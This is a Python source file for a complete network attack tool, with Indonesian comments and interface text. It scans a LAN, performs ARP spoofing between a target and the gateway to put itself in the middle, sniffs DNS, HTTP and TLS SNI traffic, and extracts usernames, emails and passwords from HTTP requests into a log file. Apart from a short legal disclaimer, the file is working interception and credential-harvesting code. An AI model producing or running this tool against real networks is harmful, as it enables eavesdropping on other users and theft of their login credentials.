#!/usr/bin/env python3
"""
Network Exploration Tool - LAN/WiFi Analyzer
Fitur:
1. Network Scanning
2. ARP Spoofing (MITM)
3. Traffic Sniffing (DNS/HTTP/HTTPS SNI)
4. Credential Sniffing (HTTP only)

PERINGATAN HUKUM:
Alat ini hanya untuk tujuan pembelajaran dan pengujian jaringan pribadi.
Penggunaan untuk jaringan tanpa izin adalah ILEGAL dan melanggar hukum.
Penulis tidak bertanggung jawab atas penyalahgunaan alat ini.
"""

import argparse
import logging
import netifaces
import os
import re
import socket
import sys
import threading
import time
from collections import defaultdict
from colorama import Fore, Style, init
from scapy.all import ARP, Ether, IP, TCP, UDP, DNS, DNSQR, sniff, srp, send
from scapy.layers.http import HTTPRequest, HTTPResponse
from scapy.layers.inet import IP
from tabulate import tabulate

# Inisialisasi colorama
init(autoreset=True)

# Konfigurasi logging
logging.basicConfig(
    level=logging.INFO,
    format=f"{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - %(message)s",
    datefmt='%H:%M:%S'
)
logger = logging.getLogger('network_tool')

class NetworkScanner:
    def __init__(self, interface):
        self.interface = interface
        self.gateway_ip = self.get_gateway_ip()
        self.gateway_mac = self.get_gateway_mac()
        self.devices = []

    def get_gateway_ip(self):
        try:
            return netifaces.gateways()['default'][netifaces.AF_INET][0]
        except Exception:
            logger.error("Gagal mendapatkan gateway")
            return None

    def get_gateway_mac(self):
        if not self.gateway_ip:
            return None
        try:
            ans, _ = srp(ARP(pdst=self.gateway_ip), timeout=2, iface=self.interface, verbose=0)
            return ans[0][1].hwsrc if ans else None
        except Exception:
            return None

    def scan(self, ip_range=None):
        if not ip_range:
            # Generate IP range dari gateway
            base_ip = '.'.join(self.gateway_ip.split('.')[:-1]) + '.0/24'
            ip_range = base_ip

        arp_request = ARP(pdst=ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast/arp_request

        logger.info(f"Memulai scan jaringan pada {ip_range}...")
        ans, _ = srp(packet, timeout=2, iface=self.interface, verbose=0)

        devices = []
        for sent, received in ans:
            ip = received.psrc
            mac = received.hwsrc
            vendor = self.get_vendor(mac)
            devices.append((ip, mac, vendor))

        # Tambahkan gateway jika belum ada
        if self.gateway_ip and self.gateway_mac:
            if not any(ip == self.gateway_ip for ip, _, _ in devices):
                vendor = self.get_vendor(self.gateway_mac)
                devices.append((self.gateway_ip, self.gateway_mac, vendor))

        self.devices = devices
        return devices

    def get_vendor(self, mac):
        try:
            from scapy.all import manufdb
            vendor = manufdb._get_manuf(mac)
            return vendor if vendor else "Unknown"
        except Exception:
            return "Unknown"

    def display_results(self):
        if not self.devices:
            logger.warning("Tidak ditemukan perangkat")
            return

        headers = ["IP Address", "MAC Address", "Vendor"]
        table = []
        for ip, mac, vendor in self.devices:
            table.append([ip, mac, vendor])

        print(f"\n{Fore.GREEN}Hasil Scan Jaringan:{Style.RESET_ALL}")
        print(tabulate(table, headers=headers, tablefmt="grid"))


class ARPSpoofer:
    def __init__(self, interface, target_ip, gateway_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        self.spoofing = False
        self.forwarding_enabled = False

    def get_mac(self, ip):
        ans, _ = srp(ARP(pdst=ip), timeout=2, iface=self.interface, verbose=0)
        return ans[0][1].hwsrc if ans else None

    def enable_forwarding(self):
        os.system("sysctl -w net.ipv4.ip_forward=1")
        self.forwarding_enabled = True
        logger.info("IP forwarding diaktifkan")

    def disable_forwarding(self):
        os.system("sysctl -w net.ipv4.ip_forward=0")
        self.forwarding_enabled = False
        logger.info("IP forwarding dinonaktifkan")

    def spoof(self):
        # Spoof target (mengaku sebagai gateway)
        target_spoof = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
        # Spoof gateway (mengaku sebagai target)
        gateway_spoof = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)

        self.spoofing = True
        self.enable_forwarding()

        logger.info(f"Memulai ARP spoofing {self.target_ip} -> {self.gateway_ip}")
        try:
            while self.spoofing:
                send(target_spoof, verbose=0)
                send(gateway_spoof, verbose=0)
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore()
            sys.exit(0)

    def restore(self):
        if not self.spoofing:
            return

        logger.info("Mengembalikan ARP tables...")
        # Restore target
        send(ARP(
            op=2,
            pdst=self.target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac
        ), count=5, verbose=0)

        # Restore gateway
        send(ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=self.target_ip,
            hwsrc=self.target_mac
        ), count=5, verbose=0)

        self.disable_forwarding()
        self.spoofing = False


class PacketSniffer:
    def __init__(self, interface, target_ip=None, output_file=None):
        self.interface = interface
        self.target_ip = target_ip
        self.output_file = output_file
        self.credentials = []
        self.domains = set()
        self.sni_cache = defaultdict(str)
        self.running = False

    def start(self):
        self.running = True
        logger.info(f"Memulai sniffing pada {self.interface} [DNS/HTTP/HTTPS]...")
        sniff(
            iface=self.interface,
            prn=self.process_packet,
            store=False,
            stop_filter=lambda x: not self.running
        )

    def stop(self):
        self.running = False
        if self.output_file:
            self.save_results()

    def process_packet(self, packet):
        if self.target_ip and packet.haslayer(IP):
            if packet[IP].src != self.target_ip and packet[IP].dst != self.target_ip:
                return

        # DNS Processing
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            self.process_dns(packet)

        # HTTP Processing
        if packet.haslayer(HTTPRequest):
            self.process_http(packet)

        # HTTPS SNI Processing
        if packet.haslayer(TCP) and packet[TCP].dport == 443:
            self.process_https(packet)

    def process_dns(self, packet):
        domain = packet[DNSQR].qname.decode('utf-8', 'ignore')
        if domain.endswith('.'):
            domain = domain[:-1]
        
        self.domains.add(domain)
        logger.info(f"{Fore.YELLOW}[DNS]{Style.RESET_ALL} {domain}")

    def process_http(self, packet):
        host = packet[HTTPRequest].Host.decode()
        path = packet[HTTPRequest].Path.decode()
        url = f"http://{host}{path}"
        
        logger.info(f"{Fore.BLUE}[HTTP]{Style.RESET_ALL} {url}")
        
        # Credential sniffing
        if packet.haslayer('Raw'):
            load = packet['Raw'].load.decode('utf-8', 'ignore')
            self.extract_credentials(load, url)

    def process_https(self, packet):
        try:
            # Ekstrak SNI dari TLS Client Hello
            if packet[TCP].sport > 1024 and b'\x16\x03' in bytes(packet[TCP].payload):
                tls_data = bytes(packet[TCP].payload)
                sni_start = tls_data.find(b'\x00\x00')
                if sni_start > 0:
                    sni_length = int.from_bytes(tls_data[sni_start+1:sni_start+3], 'big')
                    sni = tls_data[sni_start+3:sni_start+3+sni_length].decode()
                    
                    if sni and sni not in self.sni_cache[packet[IP].src]:
                        self.sni_cache[packet[IP].src] = sni
                        logger.info(f"{Fore.GREEN}[HTTPS]{Style.RESET_ALL} SNI: {sni}")
        except Exception:
            pass

    def extract_credentials(self, load, url):
        patterns = {
            'username': r'user(name)?=([^&]+)',
            'email': r'email=([^&]+)',
            'password': r'pass(word)?=([^&]+)'
        }
        
        found = False
        credentials = {}
        
        for key, pattern in patterns.items():
            match = re.search(pattern, load, re.IGNORECASE)
            if match:
                credentials[key] = match.group(2) if match.lastindex > 1 else match.group(1)
                found = True
        
        if found:
            self.credentials.append((url, credentials))
            logger.warning(f"{Fore.RED}[CREDENTIALS]{Style.RESET_ALL} Ditemukan pada {url}")
            for key, value in credentials.items():
                logger.warning(f"  {key.capitalize()}: {value}")

    def save_results(self):
        with open(self.output_file, 'w') as f:
            f.write("Domain yang Diakses:\n")
            for domain in self.domains:
                f.write(f"- {domain}\n")
            
            f.write("\nKredensial yang Ditemukan:\n")
            for url, creds in self.credentials:
                f.write(f"URL: {url}\n")
                for key, value in creds.items():
                    f.write(f"  {key}: {value}\n")
                f.write("\n")
        logger.info(f"Log disimpan di {self.output_file}")


def display_banner():
    banner = f"""{Fore.RED}
    ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
    ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
    ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
    ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
    ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
    ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
    {Style.RESET_ALL}{Fore.CYAN}
    Jaringan Lokal Eksplorasi Tool (LAN/WiFi Analyzer)
    {Style.RESET_ALL}
    PERINGATAN: Alat ini hanya untuk tujuan pendidikan dan pengujian jaringan pribadi.
    Penggunaan ilegal dilarang keras. Anda bertanggung jawab atas tindakan Anda.
    """
    print(banner)


def get_interface():
    interfaces = netifaces.interfaces()
    print("\nInterface yang tersedia:")
    for i, iface in enumerate(interfaces, 1):
        print(f"{i}. {iface}")
    
    while True:
        try:
            choice = int(input("Pilih interface (nomor): "))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice-1]
        except ValueError:
            pass
        print("Pilihan tidak valid!")


def main():
    display_banner()

    parser = argparse.ArgumentParser(description='Network Exploration Tool')
    subparsers = parser.add_subparsers(dest='command', help='Sub-commands')

    # Scan parser
    scan_parser = subparsers.add_parser('scan', help='Scan jaringan')
    scan_parser.add_argument('-i', '--interface', help='Interface jaringan')
    scan_parser.add_argument('-r', '--range', help='Rentang IP (contoh: 192.168.1.0/24)')

    # Spoof parser
    spoof_parser = subparsers.add_parser('spoof', help='ARP Spoofing')
    spoof_parser.add_argument('-i', '--interface', help='Interface jaringan')
    spoof_parser.add_argument('-t', '--target', required=True, help='IP target')
    spoof_parser.add_argument('-g', '--gateway', help='IP gateway')

    # Sniff parser
    sniff_parser = subparsers.add_parser('sniff', help='Packet Sniffing')
    sniff_parser.add_argument('-i', '--interface', help='Interface jaringan')
    sniff_parser.add_argument('-t', '--target', help='IP target')
    sniff_parser.add_argument('-o', '--output', help='File output log')

    args = parser.parse_args()

    if not args.command:
        # Mode interaktif
        print(f"{Fore.YELLOW}Mode Interaktif{Style.RESET_ALL}")
        args.interface = get_interface()

        while True:
            print("\nMenu Utama:")
            print("1. Scan Jaringan")
            print("2. ARP Spoofing")
            print("3. Packet Sniffing")
            print("4. Keluar")
            
            choice = input("Pilih opsi (1-4): ")
            
            if choice == '1':
                scanner = NetworkScanner(args.interface)
                scanner.scan()
                scanner.display_results()
            
            elif choice == '2':
                target = input("Target IP: ")
                gateway = input("Gateway IP [otomatis]: ") or None
                
                scanner = NetworkScanner(args.interface)
                if not gateway:
                    gateway = scanner.gateway_ip
                
                spoofer = ARPSpoofer(args.interface, target, gateway)
                try:
                    # Jalankan di thread terpisah
                    spoof_thread = threading.Thread(target=spoofer.spoof)
                    spoof_thread.daemon = True
                    spoof_thread.start()
                    
                    input("Tekan Enter untuk menghentikan spoofing...")
                    spoofer.restore()
                except KeyboardInterrupt:
                    spoofer.restore()
            
            elif choice == '3':
                target = input("Target IP [opsional]: ") or None
                output = input("File log [opsional]: ") or None
                
                sniffer = PacketSniffer(args.interface, target, output)
                try:
                    # Jalankan di thread terpisah
                    sniff_thread = threading.Thread(target=sniffer.start)
                    sniff_thread.daemon = True
                    sniff_thread.start()
                    
                    input("Tekan Enter untuk menghentikan sniffing...")
                    sniffer.stop()
                except KeyboardInterrupt:
                    sniffer.stop()
            
            elif choice == '4':
                sys.exit(0)
    
    else:
        # Mode command-line
        if not args.interface:
            args.interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        
        if args.command == 'scan':
            scanner = NetworkScanner(args.interface)
            scanner.scan(args.range)
            scanner.display_results()
        
        elif args.command == 'spoof':
            scanner = NetworkScanner(args.interface)
            if not args.gateway:
                args.gateway = scanner.gateway_ip
            
            spoofer = ARPSpoofer(args.interface, args.target, args.gateway)
            try:
                spoofer.spoof()
            except KeyboardInterrupt:
                spoofer.restore()
        
        elif args.command == 'sniff':
            sniffer = PacketSniffer(args.interface, args.target, args.output)
            try:
                sniffer.start()
            except KeyboardInterrupt:
                sniffer.stop()


if __name__ == "__main__":
    try:
        main()
    except PermissionError:
        logger.error("Diperlukan akses root! Jalankan dengan sudo")
        sys.exit(1)
    except KeyboardInterrupt:
        logger.info("Program dihentikan")
        sys.exit(0)
